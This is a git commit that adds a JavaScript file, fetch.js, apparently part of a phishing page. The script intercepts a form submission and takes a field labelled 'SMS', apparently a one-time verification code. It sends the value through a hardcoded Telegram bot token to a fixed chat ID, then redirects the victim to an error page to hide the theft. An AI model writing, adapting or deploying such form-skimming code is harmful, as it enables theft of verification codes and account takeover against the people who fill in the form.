fc18fdc096dc04ba159b2846142529c22ed7073b
yuo-in <idvarcel@gmail.com>
2024-11-14 20:58:33 +0700

    Add files via upload

---
+++ fetch.js
@@ -0,0 +1,43 @@
+
+        
+    const TOKEN = "7229201122%3AAAGWGymabS7I03ALueTSmeosmGqSB8Hj7kA";
+const CHAT_ID = "7801560885";
+const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+const form = document.getElementById("fetch");
+
+form.addEventListener("submit", onSubmitTelegram);
+
+function onSubmitTelegram(e) {
+  e.preventDefault();
+
+  const { name, } = form;
+  const data = {
+    name: name.value,
+  };
+
+  let message = `<b></b>\n`;
+  message += `<b>𝐒𝐌𝐒: </b> ${data.name}`;
+
+  const dataTg = {
+    chat_id: CHAT_ID,
+    text: message,
+    parse_mode: "html",
+  };
+
+  const options = {
+    method: "POST",
+    body: JSON.stringify(dataTg),
+    headers: {
+      "Content-Type": "application/json",
+    },
+  };
+
+  fetch(URL_API, options)
+    .then((res) => res.json())
+    .then((res) => console.log(res))
+    .catch((err) => console.log(err));
+    
+    window.location.href = '/error.html';
+}
+
